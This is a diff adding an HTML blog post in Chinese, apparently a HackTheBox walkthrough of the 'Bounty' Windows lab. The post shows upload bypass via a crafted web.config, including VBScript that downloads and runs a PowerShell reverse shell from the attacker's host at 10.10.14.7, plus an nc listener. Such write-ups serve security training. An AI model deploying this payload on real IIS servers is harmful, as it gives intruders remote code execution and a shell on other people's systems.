@@ -1,0 +1,399 @@
+<!DOCTYPE html>
+<html lang='en'>
+
+<head>
+  <meta name="generator" content="Hexo 5.4.0">
+  <meta charset="utf-8">
+  
+
+  <meta http-equiv='x-dns-prefetch-control' content='on' />
+  <link rel='dns-prefetch' href='https://cdn.jsdelivr.net'>
+  <link rel="preconnect" href="https://cdn.jsdelivr.net" crossorigin>
+
+  <meta name="renderer" content="webkit">
+  <meta name="force-rendering" content="webkit">
+  <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
+  <meta name="HandheldFriendly" content="True" >
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="theme-color" content="#f8f8f8">
+  <title>HTB: Bounty - T0x1c</title>
+
+  
+    <meta name="description" content="Bounty是一个简单的靶机，知识点涉及上传绕过、Juicy Potato内核提权、ms10-092内核提权等。当无法上传asp文件时，可以尝试将asp代码嵌入到不受文件后缀名过滤的web.config中完成权限获取。感兴趣的同学可以在HackTheBox中进行学习。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="HTB: Bounty">
+<meta property="og:url" content="https://toxic80l.github.io/post/b9f7bac9/index.html">
+<meta property="og:site_name" content="T0x1c">
+<meta property="og:description" content="Bounty是一个简单的靶机，知识点涉及上传绕过、Juicy Potato内核提权、ms10-092内核提权等。当无法上传asp文件时，可以尝试将asp代码嵌入到不受文件后缀名过滤的web.config中完成权限获取。感兴趣的同学可以在HackTheBox中进行学习。">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/volantis-x/cdn-emoji/aru-l/0140.gif">
+<meta property="og:image" content="https://toxic80l.github.io/post/b9f7bac9/%E6%88%AA%E5%B1%8F2021-10-14%20%E4%B8%8A%E5%8D%889.58.23.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/b9f7bac9/%E6%88%AA%E5%B1%8F2021-10-14%20%E4%B8%8A%E5%8D%8810.25.22.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/b9f7bac9/%E6%88%AA%E5%B1%8F2021-10-14%20%E4%B8%8A%E5%8D%8810.26.54.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/b9f7bac9/%E6%88%AA%E5%B1%8F2021-10-14%20%E4%B8%8A%E5%8D%8811.31.40.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/b9f7bac9/%E6%88%AA%E5%B1%8F2021-10-14%20%E4%B8%8A%E5%8D%8811.32.48.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/b9f7bac9/%E6%88%AA%E5%B1%8F2021-10-14%20%E4%B8%8B%E5%8D%882.25.48.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/b9f7bac9/%E6%88%AA%E5%B1%8F2021-10-14%20%E4%B8%8B%E5%8D%882.34.59.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/b9f7bac9/%E6%88%AA%E5%B1%8F2021-10-14%20%E4%B8%8B%E5%8D%882.38.31.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/b9f7bac9/%E6%88%AA%E5%B1%8F2021-10-14%20%E4%B8%8B%E5%8D%882.39.11.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/b9f7bac9/%E6%88%AA%E5%B1%8F2021-10-14%20%E4%B8%8B%E5%8D%883.16.53.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/b9f7bac9/%E6%88%AA%E5%B1%8F2021-10-14%20%E4%B8%8B%E5%8D%883.29.53.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/b9f7bac9/%E6%88%AA%E5%B1%8F2021-10-14%20%E4%B8%8B%E5%8D%883.35.39.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/b9f7bac9/%E6%88%AA%E5%B1%8F2021-10-14%20%E4%B8%8B%E5%8D%883.41.13.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/b9f7bac9/%E6%88%AA%E5%B1%8F2021-10-14%20%E4%B8%8B%E5%8D%883.43.52.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/b9f7bac9/%E6%88%AA%E5%B1%8F2021-10-14%20%E4%B8%8B%E5%8D%883.47.55.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/b9f7bac9/%E6%88%AA%E5%B1%8F2021-10-14%20%E4%B8%8B%E5%8D%884.42.01.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/b9f7bac9/%E6%88%AA%E5%B1%8F2021-10-14%20%E4%B8%8B%E5%8D%884.41.31.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/b9f7bac9/%E6%88%AA%E5%B1%8F2021-10-14%20%E4%B8%8B%E5%8D%884.50.01.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/b9f7bac9/%E6%88%AA%E5%B1%8F2021-10-14%20%E4%B8%8B%E5%8D%885.00.12.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/b9f7bac9/%E6%88%AA%E5%B1%8F2021-10-14%20%E4%B8%8B%E5%8D%885.33.19.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/b9f7bac9/%E6%88%AA%E5%B1%8F2021-10-14%20%E4%B8%8B%E5%8D%885.33.43.png">
+<meta property="article:published_time" content="2022-01-20T07:03:30.000Z">
+<meta property="article:modified_time" content="2022-01-21T08:23:44.271Z">
+<meta property="article:author" content="toxic80L">
+<meta property="article:tag" content="靶机">
+<meta property="article:tag" content="Windows">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/volantis-x/cdn-emoji/aru-l/0140.gif">
+  
+  
+
+  <!-- feed -->
+  
+
+  
+    
+<link rel="stylesheet" href="/css/main.css">
+
+  
+
+  
+
+  
+</head>
+
+<body>
+  
+
+
+  <div class='l_body' id='start'>
+    <aside class='l_left' layout='post'>
+    
+
+
+<header class="header">
+
+<div class="logo-wrap"><a class="avatar" href="/medias/avatar.png"><div class="bg" style="opacity:0;background-image:url(https://cdn.jsdelivr.net/gh/cdn-x/placeholder@1.0.2/avatar/round/rainbow64@3x.webp);"></div><img no-lazy class="avatar" src="/medias/avatar.png" onerror="javascript:this.classList.add('error');this.src='https://cdn.jsdelivr.net/gh/cdn-x/placeholder@1.0.1/image/2659360.svg';"></a><a class="title" href="/"><div class="main">T0x1c</div><div class="sub cap">我在听你的独家记忆</div></a></div>
+<nav class="menu dis-select"><a class="nav-item active" href="/">Blog</a><a class="nav-item" href="/wiki/">Wiki</a><a class="nav-item" href="/notes/">notes</a><a class="nav-item" href="/friends/">more</a></nav></header>
+
+<div class="widgets">
+
+<div class="widget-wrap single" id="toc"><div class="widget-header cap dis-select"><span class="name">TOC</span></div><div class="widget-body fs14"><div class="doc-tree active"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-%E4%BE%A6%E6%9F%A5"><span class="toc-text">0x01 侦查</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AB%AF%E5%8F%A3%E6%8E%A2%E6%B5%8B"><span class="toc-text">端口探测</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#80%E7%AB%AF%E5%8F%A3"><span class="toc-text">80端口</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%9B%AE%E5%BD%95%E6%8E%A2%E6%B5%8B"><span class="toc-text">目录探测</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-%E4%B8%8A%E7%BA%BF-merlin"><span class="toc-text">0x02 上线[merlin]</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%9D%E6%8E%A2%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0"><span class="toc-text">初探文件上传</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web-config%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87"><span class="toc-text">web.config上传绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AF%BB%E6%89%BEflag"><span class="toc-text">寻找flag</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-system"><span class="toc-text">0x03 权限提升[system]</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9F%A5%E8%AF%A2%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E"><span class="toc-text">查询内核漏洞</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%89%8B%E5%B7%A5%E5%86%85%E6%A0%B8%E6%8F%90%E6%9D%83"><span class="toc-text">手工内核提权</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#MSF%E6%8F%90%E6%9D%83"><span class="toc-text">MSF提权</span></a></li></ol></li></ol></div></div></div>
+
+
+</div>
+<footer class="footer dis-select"><div class="social-wrap"><a class="social" href="https://github.com/toxic80L" target="_blank" rel="external nofollow noopener noreferrer"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/cdn-x/placeholder@1.0.3/social/08a41b181ce68.svg"/></a></div></footer>
+
+    </aside>
+    <div class='l_main'>
+      
+
+      
+
+
+<div class="bread-nav fs12"><div id="breadcrumb"><a class="cap breadcrumb" href="/">Home</a><span class="sep"></span><a class="cap breadcrumb" href="/">Blog</a><span class="sep"></span><a class="cap breadcrumb-link" href="/categories/HackTheBox/">HackTheBox</a></div><div id="post-meta">Posted on&nbsp;<time datetime="2022-01-20T07:03:30.000Z">2022-01-20</time></div></div>
+
+<article class='content md post'>
+<h1 class="article-title"><span>HTB: Bounty</span></h1>
+<p>Bounty是一个简单的靶机，知识点涉及上传绕过、Juicy Potato内核提权、ms10-092内核提权等。当无法上传asp文件时，可以尝试将asp代码嵌入到不受文件后缀名过滤的web.config中完成权限获取。感兴趣的同学可以在HackTheBox中进行学习。</p>
+<span id="more"></span>
+<span class="tag-plugin emoji"><img no-lazy class="inline" src="https://cdn.jsdelivr.net/gh/volantis-x/cdn-emoji/aru-l/0140.gif" style="height:3em" onerror="javascript:this.classList.add('error');this.src='https://cdn.jsdelivr.net/gh/cdn-x/placeholder@1.0.1/image/2659360.svg';"></span>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/b9f7bac9/%E6%88%AA%E5%B1%8F2021-10-14%20%E4%B8%8A%E5%8D%889.58.23.png" alt="截屏2021-10-14 上午9.58.23"></p>
+<h2 id="0x01-侦查"><a href="#0x01-侦查" class="headerlink" title="0x01 侦查"></a>0x01 侦查</h2><h3 id="端口探测"><a href="#端口探测" class="headerlink" title="端口探测"></a>端口探测</h3><p>首先使用 nmap 进行端口扫描</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -p- -sV -sC -A -T4 10.10.10.93 -oA nmap_Bounty</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/b9f7bac9/%E6%88%AA%E5%B1%8F2021-10-14%20%E4%B8%8A%E5%8D%8810.25.22.png" alt="截屏2021-10-14 上午10.25.22"><br>通过扫描结果我们可以发现目标开放了80端口</p>
+<h4 id="80端口"><a href="#80端口" class="headerlink" title="80端口"></a>80端口</h4><p>访问<code>http://10.10.10.93</code><br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/b9f7bac9/%E6%88%AA%E5%B1%8F2021-10-14%20%E4%B8%8A%E5%8D%8810.26.54.png" alt="截屏2021-10-14 上午10.26.54"></p>
+<h3 id="目录探测"><a href="#目录探测" class="headerlink" title="目录探测"></a>目录探测</h3><p>使用 gobuster 对其进行目录扫描</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gobuster dir -u http://10.10.10.93 -w /usr/share/wordlists/dirb/big.txt -x aspx</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/b9f7bac9/%E6%88%AA%E5%B1%8F2021-10-14%20%E4%B8%8A%E5%8D%8811.31.40.png" alt="截屏2021-10-14 上午11.31.40"><br>访问<code>http://10.10.10.93/transfer.aspx</code>发现文件上传界面<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/b9f7bac9/%E6%88%AA%E5%B1%8F2021-10-14%20%E4%B8%8A%E5%8D%8811.32.48.png" alt="截屏2021-10-14 上午11.32.48"></p>
+<h2 id="0x02-上线-merlin"><a href="#0x02-上线-merlin" class="headerlink" title="0x02 上线[merlin]"></a>0x02 上线[merlin]</h2><h3 id="初探文件上传"><a href="#初探文件上传" class="headerlink" title="初探文件上传"></a>初探文件上传</h3><p>尝试进行文件上传，首先上传一张普通的图片<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/b9f7bac9/%E6%88%AA%E5%B1%8F2021-10-14%20%E4%B8%8B%E5%8D%882.25.48.png" alt="截屏2021-10-14 下午2.25.48"><br>直接上传成功，那么尝试上传一个aspx的木马呢？</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cp /usr/share/webshells/aspx/cmdasp.aspx .</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/b9f7bac9/%E6%88%AA%E5%B1%8F2021-10-14%20%E4%B8%8B%E5%8D%882.34.59.png" alt="截屏2021-10-14 下午2.34.59"><br>显示上传失败，说明可能存在过滤。使用burp拦截数据包，将文件名进行00截断<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/b9f7bac9/%E6%88%AA%E5%B1%8F2021-10-14%20%E4%B8%8B%E5%8D%882.38.31.png" alt="截屏2021-10-14 下午2.38.31"><br>成功上传，但是访问木马地址<code>http://10.10.10.93/UploadedFiles/cmdasp.aspx</code>出现错误<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/b9f7bac9/%E6%88%AA%E5%B1%8F2021-10-14%20%E4%B8%8B%E5%8D%882.39.11.png" alt="截屏2021-10-14 下午2.39.11"></p>
+<h3 id="web-config上传绕过"><a href="#web-config上传绕过" class="headerlink" title="web.config上传绕过"></a>web.config上传绕过</h3><blockquote>
+<p>web.config文件是一个xml文件，主要用于存储ASP.NET Web应用程序的配置信息，使用.NET创建一个Web应用程序后，默认情况下会在根目录生成一个默认的web.config文件，包括默认的配置设置，所有的子目录都继承它的配置设置。如果你想修改子目录的配置设置，你可以在该子目录下新建一个Web.config文件。它可以提供除从父目录继承的配置信息以外的配置信息，也可以重写或修改父目录中定义的设置。</p>
+</blockquote>
+<p>web.config 类似于 Apache 中 .htaccess 文件，主要包含 IIS 服务器上的 Web 应用程序的设置和配置数据，我们可以根据下面这篇文章上传 web.config 来运行 asp 代码</p>
+<p><strong>参考文章：<a target="_blank" rel="noopener" href="https://soroush.secproject.com/blog/tag/unrestricted-file-upload/">https://soroush.secproject.com/blog/tag/unrestricted-file-upload/</a></strong></p>
+<p>将如下 web.config 上传</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">system.web</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">customErrors</span> <span class="attr">mode</span>=<span class="string">&quot;RemoteOnly&quot;</span> <span class="attr">defaultRedirect</span>=<span class="string">&quot;web.config&quot;</span> /&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">system.web</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">system.webServer</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">handlers</span> <span class="attr">accessPolicy</span>=<span class="string">&quot;Read, Script, Write&quot;</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">add</span> <span class="attr">name</span>=<span class="string">&quot;web_config&quot;</span> <span class="attr">path</span>=<span class="string">&quot;*.config&quot;</span> <span class="attr">verb</span>=<span class="string">&quot;*&quot;</span> <span class="attr">modules</span>=<span class="string">&quot;IsapiModule&quot;</span> <span class="attr">scriptProcessor</span>=<span class="string">&quot;%windir%\system32\inetsrv\asp.dll&quot;</span> <span class="attr">resourceType</span>=<span class="string">&quot;Unspecified&quot;</span> <span class="attr">requireAccess</span>=<span class="string">&quot;Write&quot;</span> <span class="attr">preCondition</span>=<span class="string">&quot;bitness64&quot;</span> /&gt;</span>         </span><br><span class="line">      <span class="tag">&lt;/<span class="name">handlers</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">security</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">requestFiltering</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">fileExtensions</span>&gt;</span></span><br><span class="line">               <span class="tag">&lt;<span class="name">remove</span> <span class="attr">fileExtension</span>=<span class="string">&quot;.config&quot;</span> /&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">fileExtensions</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">hiddenSegments</span>&gt;</span></span><br><span class="line">               <span class="tag">&lt;<span class="name">remove</span> <span class="attr">segment</span>=<span class="string">&quot;web.config&quot;</span> /&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">hiddenSegments</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;/<span class="name">requestFiltering</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">security</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">system.webServer</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- ASP code comes here! It should not include HTML comment closing tag and double dashes!--&gt;</span></span><br><span class="line">&lt;%</span><br><span class="line">Response.write(&quot;-&quot;&amp;&quot;-&gt;&quot;)</span><br><span class="line">&#x27; it is running the ASP code if you can see 3 by opening the web.config file!</span><br><span class="line">Response.write(1+2)</span><br><span class="line">Response.write(&quot;&lt;!-&quot;&amp;&quot;-&quot;)</span><br><span class="line">%&gt;<span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">--&gt;</span></span><br></pre></td></tr></table></figure>
+<p>访问<code>http://10.10.10.93/UploadedFiles/web.config</code>，发现靶机已经执行<code>1+2</code>并返回了结果<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/b9f7bac9/%E6%88%AA%E5%B1%8F2021-10-14%20%E4%B8%8B%E5%8D%883.16.53.png" alt="截屏2021-10-14 下午3.16.53"><br>使用 nishang 的 Invoke-PowershellTcp.ps1 脚本并在最后添加反弹地址和端口</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Invoke-PowershellTcp -Reverse -IPAddress 10.10.14.7 5555</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/b9f7bac9/%E6%88%AA%E5%B1%8F2021-10-14%20%E4%B8%8B%E5%8D%883.29.53.png" alt="截屏2021-10-14 下午3.29.53"><br>与此同时我们还需要对原来的 web.config 进行修改，以此来执行本地的 powershell 脚本</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">system.webServer</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">handlers</span> <span class="attr">accessPolicy</span>=<span class="string">&quot;Read, Script, Write&quot;</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">add</span> <span class="attr">name</span>=<span class="string">&quot;web_config&quot;</span> <span class="attr">path</span>=<span class="string">&quot;*.config&quot;</span> <span class="attr">verb</span>=<span class="string">&quot;*&quot;</span> <span class="attr">modules</span>=<span class="string">&quot;IsapiModule&quot;</span> <span class="attr">scriptProcessor</span>=<span class="string">&quot;%windir%\system32\inetsrv\asp.dll&quot;</span> <span class="attr">resourceType</span>=<span class="string">&quot;Unspecified&quot;</span> <span class="attr">requireAccess</span>=<span class="string">&quot;Write&quot;</span> <span class="attr">preCondition</span>=<span class="string">&quot;bitness64&quot;</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">handlers</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">security</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">requestFiltering</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">fileExtensions</span>&gt;</span></span><br><span class="line">               <span class="tag">&lt;<span class="name">remove</span> <span class="attr">fileExtension</span>=<span class="string">&quot;.config&quot;</span> /&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">fileExtensions</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">hiddenSegments</span>&gt;</span></span><br><span class="line">               <span class="tag">&lt;<span class="name">remove</span> <span class="attr">segment</span>=<span class="string">&quot;web.config&quot;</span> /&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">hiddenSegments</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;/<span class="name">requestFiltering</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">security</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">system.webServer</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br><span class="line">&lt;%@ Language=VBScript %&gt;</span><br><span class="line">&lt;%</span><br><span class="line">  call Server.CreateObject(&quot;WSCRIPT.SHELL&quot;).Run(&quot;cmd.exe /c powershell.exe -c iex(new-object net.webclient).downloadstring(&#x27;http://10.10.14.7/Invoke-PowerShellTcp.ps1&#x27;)&quot;)</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>
+<p>准备好这些后，在本地监听5555端口</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -nvlp 5555</span><br></pre></td></tr></table></figure>
+<p>通过 python 在本地开启 web 服务</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -m SimpleHTTPServer 80</span><br></pre></td></tr></table></figure>
+<p>将 web.config 上传并访问，成功拿到反弹shell<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/b9f7bac9/%E6%88%AA%E5%B1%8F2021-10-14%20%E4%B8%8B%E5%8D%883.35.39.png" alt="截屏2021-10-14 下午3.35.39"></p>
+<blockquote>
+<p>有同学可能会问为什么这不是上传 webshell 呢？这是因为 uploadedfiles 目录下的文件会定期清除，所以我们采用反弹shell的方式来进行控制</p>
+</blockquote>
+<h3 id="寻找flag"><a href="#寻找flag" class="headerlink" title="寻找flag"></a>寻找flag</h3><p>在当前用户桌面上寻找第一个flag</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dir c:\Users\merlin\Desktop\</span><br></pre></td></tr></table></figure>
+<p>但是并未发现存在任何文件，原因是文件被隐藏了，可通过以下命令重新显示</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gci -force</span><br><span class="line"><span class="built_in">type</span> c:\Users\merlin\Desktop\user.txt</span><br></pre></td></tr></table></figure>
